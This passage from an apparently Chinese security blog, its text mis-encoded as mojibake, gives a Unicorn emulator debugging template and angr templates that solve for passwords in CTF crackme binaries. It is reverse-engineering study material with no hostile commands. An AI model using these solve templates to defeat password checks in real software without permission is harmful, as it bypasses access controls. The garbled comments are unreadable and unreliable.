class="line">            arm64_const.UC_ARM64_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">            arm64_const.UC_ARM64_REG_PC: <span class="string">&quot;PC&quot;</span>,</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REG_AMD64 = &#123;x86_const.UC_X86_REG_RAX: <span class="string">&quot;RAX&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RBX: <span class="string">&quot;RBX&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RCX: <span class="string">&quot;RCX&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RDX: <span class="string">&quot;RDX&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RDI: <span class="string">&quot;RDI&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RSI: <span class="string">&quot;RSI&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R8: <span class="string">&quot;R8&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R9: <span class="string">&quot;R9&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R10: <span class="string">&quot;R10&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R11: <span class="string">&quot;R11&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R12: <span class="string">&quot;R12&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R13: <span class="string">&quot;R13&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R14: <span class="string">&quot;R14&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_R15: <span class="string">&quot;R15&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RBP: <span class="string">&quot;RBP&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RSP: <span class="string">&quot;RSP&quot;</span>,</span><br><span class="line">             x86_const.UC_X86_REG_RIP: <span class="string">&quot;RIP&quot;</span>,</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">REG_MIPS = &#123;</span><br><span class="line">    mips_const.UC_MIPS_REG_ZERO: <span class="string">&quot;ZERO&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_V0: <span class="string">&quot;V0&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_V1: <span class="string">&quot;V1&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_AT: <span class="string">&quot;AT&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_A0: <span class="string">&quot;A0&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_A1: <span class="string">&quot;A1&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_A2: <span class="string">&quot;A2&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_A3: <span class="string">&quot;A3&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T0: <span class="string">&quot;T0&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T1: <span class="string">&quot;T1&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T2: <span class="string">&quot;T2&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T3: <span class="string">&quot;T3&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T4: <span class="string">&quot;T4&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T5: <span class="string">&quot;T5&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T6: <span class="string">&quot;T6&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T7: <span class="string">&quot;T7&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S0: <span class="string">&quot;S0&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S1: <span class="string">&quot;S1&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S2: <span class="string">&quot;S2&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S3: <span class="string">&quot;S3&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S4: <span class="string">&quot;S4&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S5: <span class="string">&quot;S5&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S6: <span class="string">&quot;S6&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_S7: <span class="string">&quot;S7&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T8: <span class="string">&quot;T8&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_T9: <span class="string">&quot;T9&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_GP: <span class="string">&quot;GP&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_FP: <span class="string">&quot;FP&quot;</span>,</span><br><span class="line">    mips_const.UC_MIPS_REG_RA: <span class="string">&quot;RA&quot;</span>,</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REG_TABLE = &#123;UC_ARCH_ARM: REG_ARM, UC_ARCH_X86: REG_AMD64,UC_ARCH_MIPS: REG_MIPS,UC_ARCH_ARM64:REG_ARM64&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="ä½¿ç”¨æ–¹æ³•ï¼š"   >
          <a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">THUMB = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x10</span></span><br><span class="line"><span class="string">    mov rdx,0x20</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">ADDRESS = <span class="number">0x10000</span></span><br><span class="line"><span class="comment">#æ³¨æ„å¤§ç«¯åºçš„è¯éœ€è¦åŠ ä¸Šè®¾ç½®æˆUC_MODE_64+UC_MODE_BIG_ENDIAN</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">0x10000</span>)</span><br><span class="line">mu.mem_write(ADDRESS, THUMB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debugger attach</span></span><br><span class="line"><span class="comment">#éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªéœ€è¦æ”¾åœ¨hookå‡½æ•°ä¹‹å‰æ‰è¡Œï¼Œä¸ç„¶å¯èƒ½å‡ºç°ä¸€äº›æ„æƒ³ä¸åˆ°çš„é”™è¯¯</span></span><br><span class="line">udbg = UnicornDebugger(mu)</span><br><span class="line">udbg.add_bpt(ADDRESS)</span><br><span class="line"></span><br><span class="line"><span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(THUMB))</span><br></pre></td></tr></table></div></figure>

<p>è°ƒè¯•èµ·æ¥ä¹‹åï¼Œè¾“å…¥helpè·å–ç›¸å…³çš„å‘½ä»¤ä¿¡æ¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211854104.png" alt="image-20220221185425958"></p>

        <h3 id="æ·»åŠ å‘½ä»¤ï¼š"   >
          <a href="#æ·»åŠ å‘½ä»¤ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ·»åŠ å‘½ä»¤ï¼š" class="headerlink" title="æ·»åŠ å‘½ä»¤ï¼š"></a>æ·»åŠ å‘½ä»¤ï¼š</h3>
      <p>å…¶å®<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/user-617255.htm" >æ— åä¾ å¸ˆå‚…</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>çš„æ¨¡æ¿å·²ç»å†™å¾—æŒºå¥½äº†ï¼Œæˆ‘ä»¬åªè¦å¾€ä¸ŠåŠ å°±è¡Œäº†ï¼Œä¸»è¦è¿˜æ˜¯è®¾ç½®<code>UnicornDebugger</code>è¿™ä¸ªç±»ï¼Œåœ¨ä¸­æ–­å¤„ç†è¿™é‡Œæ·»åŠ å‘½ä»¤</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211856245.png" alt="image-20220221185630168"></p>

        <h2 id="4-æ¨¡æ¿"   >
          <a href="#4-æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æ¨¡æ¿" class="headerlink" title="4.æ¨¡æ¿"></a>4.æ¨¡æ¿</h2>
      <p>æˆ‘ä»¬ç”¨unicornè¿˜æ˜¯ä½¿ç”¨æ¨¡æ¿æ¥è¿›è¡Œè°ƒè¯•æ›´å¥½ï¼Œè¿™æ ·èƒ½åŠ å¿«åˆ†æçš„é€Ÿåº¦ï¼Œè¿™é‡Œå°±ç»™å‡ºè‡ªå·±çš„ä¸€ä¸ªå¸¸ç”¨æ¨¡æ¿</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicornDbg <span class="keyword">import</span> uniDbg</span><br><span class="line"><span class="keyword">import</span> ipdb</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_OneStep</span>(<span class="params">uc, address, size, user_data</span>):</span></span><br><span class="line">    <span class="comment">#print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; % (address, size))</span></span><br><span class="line">    <span class="comment"># åˆ©ç”¨retæ¥è·³è¿‡printfå‡½æ•°ï¼Œç±»ä¼¼è¿˜å¯ä»¥è·³è¿‡å…¶ä»–å‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0x640</span>:  <span class="comment"># printf</span></span><br><span class="line">        rsp = uc.reg_read(UC_X86_REG_RSP)</span><br><span class="line">        retn_addr = u64(uc.mem_read(rsp, <span class="number">8</span>))</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, retn_addr)</span><br><span class="line">    <span class="comment"># è·³è¿‡æŸæ¡æŒ‡ä»¤ï¼Œè¿™é‡Œè·³è¿‡mov rax,1æŒ‡ä»¤</span></span><br><span class="line">    CODE = uc.mem_read(address,<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">if</span> CODE == asm(<span class="string">&#x27;&#x27;&#x27;mov rax,1&#x27;&#x27;&#x27;</span>):</span><br><span class="line">    <span class="comment">#if CODE == b&quot;\xb9\x00\x00\x00\x00&quot;:</span></span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP,address + <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27;</span> %(address, size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initReg</span>(<span class="params">uc, STACK_ADDRESS=<span class="number">0x7F00000000</span>, RAX=<span class="number">0</span>, RBX=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            RCX=<span class="number">0</span>, RDX=<span class="number">0</span>, RSI=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            RDI=<span class="number">0</span>, R8=<span class="number">0</span>, R9=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            R10=<span class="number">0</span>, R11=<span class="number">0</span>, R12=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            R13=<span class="number">0</span>, R14=<span class="number">0</span>, R15=<span class="number">0</span></span>):</span></span><br><span class="line">    uc.reg_write(UC_X86_REG_RAX, RAX)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RBX, RBX)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RCX, RCX)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RDX, RDX)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RSI, RSI)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RDI, RDI)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R8, R8)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R9, R9)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R10, R10)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R11, R11)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R12, R12)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R13, R13)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R14, R14)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R15, R15)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + <span class="number">0x100</span>)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RBP, STACK_ADDRESS + <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initUC</span>(<span class="params">uc, CODE_DATA,CODE_ADDRESS=<span class="number">0x40000</span>,CODE_SIZE=<span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">           STACK_ADDRESS=<span class="number">0x7F00000000</span>, STACK_SIZE=<span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span>):</span></span><br><span class="line">    <span class="comment"># è·å–ä¸€å—å†…å­˜ç”¨æ¥ä¿å­˜ç¨‹åºçš„æ‰€æœ‰æ•°æ®</span></span><br><span class="line">    uc.mem_map(CODE_ADDRESS, CODE_SIZE, UC_PROT_ALL)</span><br><span class="line">    uc.mem_map(STACK_ADDRESS, STACK_SIZE, UC_PROT_ALL)</span><br><span class="line">    uc.mem_write(CODE_ADDRESS, CODE_DATA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#&quot;.text&quot;/&quot;.bss&quot;/&quot;.got.plt&quot; å³å„æ®µåç§°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCODEFromBinary</span>(<span class="params">binary,start = <span class="literal">None</span>,count=<span class="number">0x100</span></span>):</span></span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(start == <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(binary, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            CODE_DATA = f.read()</span><br><span class="line">        <span class="keyword">return</span> CODE_DATA</span><br><span class="line">    <span class="keyword">elif</span>( <span class="built_in">isinstance</span>(start,<span class="built_in">str</span>)):</span><br><span class="line">        start_addr = elf.get_section_by_name(start).header.sh_addr</span><br><span class="line">        count = elf.get_section_by_name(start).header.sh_size</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start_addr = start</span><br><span class="line">    CODE_DATA = elf.read(start_addr,count)</span><br><span class="line">    <span class="keyword">return</span> CODE_DATA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate amd64 code&quot;</span>)</span><br><span class="line">    uc = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">    binary = <span class="string">&quot;/home/hacker/Desktop/test/note/note&quot;</span></span><br><span class="line"></span><br><span class="line">    CODE_ADDRESS = <span class="number">0x400000</span></span><br><span class="line">    START_ADDRESS = CODE_ADDRESS + <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    CODE_DATA = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    mov rdx,1</span></span><br><span class="line"><span class="string">    mov rcx,1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#CODE_DATA = getCODEFromBinary(binary,&quot;.text&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–UC</span></span><br><span class="line">    initUC(uc, CODE_DATA,CODE_ADDRESS)</span><br><span class="line">    initReg(uc, RSI=<span class="number">0x20</span>, RCX=<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#éœ€è¦æ”¾åœ¨hookå‡½æ•°ä¹‹å‰</span></span><br><span class="line">    udbg = uniDbg.UnicornDebugger(uc)</span><br><span class="line">    udbg.add_bpt(START_ADDRESS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ·»åŠ hook_OneStepå‡½æ•°ï¼Œä½¿å¾—CODE_ADDRESS~CODE_ADDRESS+len(CODE_DATA)ä¸­æ¯æ¡æŒ‡ä»¤æ‰§è¡Œæ—¶</span></span><br><span class="line">    <span class="comment"># éƒ½è°ƒç”¨è¯¥hook_OneStepå‡½æ•°</span></span><br><span class="line">    uc.hook_add(UC_HOOK_CODE, hook_OneStep, <span class="literal">None</span>, START_ADDRESS,START_ADDRESS+<span class="built_in">len</span>(CODE_DATA))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è¿è¡Œä¸€æ®µä»£ç </span></span><br><span class="line">        uc.emu_start(START_ADDRESS, START_ADDRESS + <span class="number">0x30</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></div></figure>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/19/Angr%E6%89%8B%E5%86%8C/">Angræ‰‹å†Œ</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-07-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€åˆå§‹åŒ–"   >
          <a href="#ä¸€ã€åˆå§‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€åˆå§‹åŒ–" class="headerlink" title="ä¸€ã€åˆå§‹åŒ–"></a>ä¸€ã€åˆå§‹åŒ–</h1>
      
        <h2 id="â–²ç®€å•ä½¿ç”¨"   >
          <a href="#â–²ç®€å•ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²ç®€å•ä½¿ç”¨" class="headerlink" title="â–²ç®€å•ä½¿ç”¨"></a>â–²ç®€å•ä½¿ç”¨</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p=angr.Project(<span class="string">&quot;./signal.exe&quot;</span>)         <span class="comment">#åŠ è½½æ–‡ä»¶</span></span><br><span class="line">state=p.factory.entry_state()          <span class="comment">#åˆ›é€ çŠ¶æ€stateï¼Œ entry_stateæ„é€ ä¸€ä¸ªä»å‡½æ•°å…¥å£ç‚¹æ‰§è¡Œçš„çŠ¶æ€</span></span><br><span class="line">sm=p.factory.simgr(state)              <span class="comment">#æ¨¡æ‹Ÿç®¡ç†å™¨</span></span><br><span class="line">good=<span class="number">0x4017A5</span>                          <span class="comment">#æƒ³è¦çš„åœ°å€</span></span><br><span class="line">fail=<span class="number">0x4017A5</span></span><br><span class="line">sm.explore(find=good,avoid=fail)</span><br><span class="line"><span class="keyword">if</span> sm.found:                           <span class="comment">#å¦‚æœfoundåˆ†ç±»ä¸ä¸ºç©º</span></span><br><span class="line">    find_state=sm.found[<span class="number">0</span>]             <span class="comment">#foundé‡Œçš„çŠ¶æ€ç»™find_state</span></span><br><span class="line">    <span class="built_in">print</span>(find_state.posix.dumps(<span class="number">0</span>))    <span class="comment">#è·å–è¾“å…¥</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="â–²æ¨¡æ¿"   >
          <a href="#â–²æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ¨¡æ¿" class="headerlink" title="â–²æ¨¡æ¿"></a>â–²æ¨¡æ¿</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">filePath = <span class="string">&quot;/home/hacker/Desktop/Reverse/Angr/AngrCTF_FITM/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Go</span>():</span></span><br><span class="line">    path_to_binary = filePath + <span class="string">&quot;./14_angr_shared_library/lib14_angr_shared_library.so&quot;</span></span><br><span class="line"></span><br><span class="line">    base = <span class="number">0x4000000</span></span><br><span class="line">    project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">        <span class="string">&#x27;main_opts&#x27;</span> : &#123;<span class="string">&#x27;custom_base_addr&#x27;</span> : base&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line">    validate_function_address = base + <span class="number">0x6d7</span></span><br><span class="line">    initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">    </span><br><span class="line">    password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">    initial_state.memory.store(buffer_pointer, password)</span><br><span class="line">    </span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    </span><br><span class="line">    success_address = base + <span class="number">0x783</span></span><br><span class="line">    simulation.explore(find=success_address)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> simulation.found:</span><br><span class="line">            solution_state = i</span><br><span class="line">            solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)</span><br><span class="line">            solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Success! Solution is: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(solution))</span><br><span class="line">            <span class="comment">#print(scanf0_solution, scanf1_solution)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></div></figure>






        <h2 id="1-åˆ›å»ºProject"   >
          <a href="#1-åˆ›å»ºProject" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºProject" class="headerlink" title="1.åˆ›å»ºProject"></a>1.åˆ›å»ºProject</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path_to_binary = filePath + <span class="string">&quot;00_angr_find/00_angr_find&quot;</span></span><br><span class="line">project = angr.Project(path_to_binary, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></div></figure>

<p><code>auto_load_libs</code>ï¼šè¡¨æ˜¯å¦è½½å…¥ä¾èµ–åº“çš„å‡½æ•°ï¼Œlibcç­‰ï¼Œå¦‚æœä¸è½½å…¥ï¼Œè¿”å›çš„å€¼æ˜¯ä¸å¯çº¦æŸçš„ï¼Œä½†æ˜¯è½½å…¥å¯èƒ½ä¼šè·¯å¾„çˆ†ç‚¸ã€‚</p>
<p><code>initial_state</code>ï¼šå‘Šè¯‰angrä»å…¥å£å¤„å¼€å§‹ï¼Œæˆ–è€…ä»æŒ‡å®šçš„åœ°å€<code>start_address</code>å¼€å§‹ï¼Œä¸è¿‡è¿™æ ·ä¸€èˆ¬éœ€è¦è®¾ç½®ä¸€ä¸‹å¯„å­˜å™¨ã€‚</p>
